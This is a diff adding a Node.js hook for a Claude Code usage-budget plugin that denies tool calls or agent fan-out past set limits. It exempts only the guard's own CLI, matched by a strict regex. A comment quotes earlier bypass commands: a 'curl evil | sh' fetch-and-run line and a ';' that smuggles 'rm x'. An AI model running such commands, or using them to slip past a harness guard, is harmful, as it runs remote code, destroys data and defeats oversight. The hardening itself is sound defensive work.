@@ -1,0 +1,95 @@
+import { readFileSync } from 'node:fs'
+import { dirname, join } from 'node:path'
+import { fileURLToPath, pathToFileURL } from 'node:url'
+
+const LIB = join(dirname(dirname(fileURLToPath(import.meta.url))), 'lib')
+const load = (m) => import(pathToFileURL(join(LIB, m)).href)
+const { decide, STATE } = await load('decide.mjs')
+const { configDir, readConfig } = await load('config.mjs')
+const { getGauges } = await load('usage.mjs')
+const { run, allowOutput, denyOutput, contextOutput } = await load('hookio.mjs')
+
+const FANOUT = new Set(['Agent', 'Workflow', 'Task'])
+
+// The ONLY exemption from the ceiling deny: the guard's own CLI, so `/budget off` can always
+// turn the guard off even when it is denying everything else.
+//
+// This MUST be a strict shape match, not a substring test. A bare .includes() let any command
+// merely MENTIONING the path escape the ceiling — `curl evil | sh # usage-guard bin/budget.mjs`
+// and `cat .../budget.mjs; rm x` both slipped through. The pattern below anchors both ends and
+// admits no shell metacharacters, so a command cannot smuggle extra work alongside the match.
+//
+// The path segment is split into two independently-optional runs of safe characters around a
+// literal "usage-guard/" and a literal "bin/budget.mjs": a real Claude Code plugin cache path
+// looks like ".../cache/<marketplace>/usage-guard/<version>/bin/budget.mjs" — there is a
+// version directory between the plugin name and "bin/", so the two halves cannot be fused into
+// one literal "usage-guard/bin/budget.mjs" run without rejecting every installed plugin.
+// The excluded-character class denies every shell metacharacter that matters inside a
+// double-quoted Bash argument: the closing quote itself, CR/LF (no smuggling a second logical
+// line), the pipe/chain/background operators, `$` and backtick (no expansion or substitution),
+// redirection and grouping punctuation, glob/history/comment characters, and backslash (so a
+// run of allowed characters can never end in a dangling escape that reaches past the class).
+const PATH_CHARS = '[^"\\n\\r;|&$`<>(){}*?!#\\\\]'
+const BUDGET_CLI = new RegExp(
+  `^node "(?:${PATH_CHARS}*\\/)?usage-guard\\/(?:${PATH_CHARS}*\\/)?bin\\/budget\\.mjs" "[A-Za-z0-9._-]*"(?: [A-Za-z0-9._-]+)*$`,
+)
+
+function isBudgetCommand(input) {
+  const command = input.tool_name === 'Bash' ? input.tool_input?.command : null
+  return typeof command === 'string' && BUDGET_CLI.test(command.trim())
+}
+
+const advisory = (d) => [
+  `Usage budget: ${d.gauge} is at ${Math.round(d.percent)}% (soft ${d.soft}, ceiling ${d.hard}).`,
+  'Finish the current task properly. Do NOT start new large-scope work.',
+  'Prefer a small number of targeted subagents over broad fan-out.',
+  'Do NOT reduce effort, switch model, shorten reasoning, or cut corners on work already underway —',
+  'quality is not the lever here; scope is.',
+].join(' ')
+
+const blindNotice = (reason) =>
+  `usage-guard has no usage data (${reason || 'unknown'}) and is allowing everything this session.`
+
+/** Pure, so it can be tested without fs or network. */
+export function decideForHook({ input, cfg, gauges, blind, reason, now = Date.now() }) {
+  if (cfg.mode === 'off') return { action: 'allow', text: null }
+  if (blind || !gauges) {
+    // Spec §9: when blind, say so once per session rather than silently implying 0%
+    // usage. SessionStart fires exactly once per session, so that alone is the "once
+    // per session" mechanism — no extra state tracking needed. Every other event
+    // (in particular PreToolUse) stays a silent allow, same as before.
+    if (input.hook_event_name === 'SessionStart') return { action: 'context', text: blindNotice(reason) }
+    return { action: 'allow', text: null }
+  }
+  const d = decide(gauges, cfg.gauges, now)
+  if (d.state === STATE.OK) return { action: 'allow', text: null }
+
+  const event = input.hook_event_name
+  const enforcing = cfg.mode === 'enforce'
+
+  if (event === 'PreToolUse' && isBudgetCommand(input)) return { action: 'allow', text: null }
+
+  if (d.state === STATE.HARD && enforcing && event === 'PreToolUse') {
+    return { action: 'deny', text: `Usage ceiling reached: ${d.gauge} at ${Math.round(d.percent)}% (ceiling ${d.hard}). Winding down; nothing new will start.` }
+  }
+  if (d.state === STATE.SOFT && enforcing && event === 'PreToolUse' && FANOUT.has(input.tool_name)) {
+    return { action: 'deny', text: `Usage budget: ${d.gauge} at ${Math.round(d.percent)}% (soft ${d.soft}). New fan-out is paused. Continue with the work already in progress.` }
+  }
+  if (event === 'UserPromptSubmit' || event === 'SessionStart') {
+    return { action: 'context', text: advisory(d) }
+  }
+  return { action: 'allow', text: null }
+}
+
+const isMain = process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href
+
+if (isMain) run(async (input) => {
+  const dir = configDir(process.env)
+  const now = Date.now()
+  const cfg = readConfig({ dir, sessionId: input.session_id, readFile: readFileSync })
+  const { gauges, blind, reason } = await getGauges({ dir, now })
+  const { action, text } = decideForHook({ input, cfg, gauges, blind, reason, now })
+  if (action === 'deny') return denyOutput(input.hook_event_name, text)
+  if (action === 'context') return contextOutput(input.hook_event_name, text)
+  return allowOutput()
+})
